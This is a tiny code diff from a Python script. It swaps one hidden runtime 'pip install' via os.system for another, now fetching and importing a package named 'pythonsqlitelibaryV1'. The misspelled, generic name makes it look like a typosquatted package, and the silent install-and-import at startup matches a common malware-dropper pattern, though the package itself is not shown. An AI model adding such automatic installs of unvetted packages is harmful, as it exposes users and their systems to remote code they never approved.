@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringpackageV1")
-import pythoncoloringpackageV1
+os.system("pip install pythonsqlitelibaryV1")
+import pythonsqlitelibaryV1
 import random
 import requests
 import time
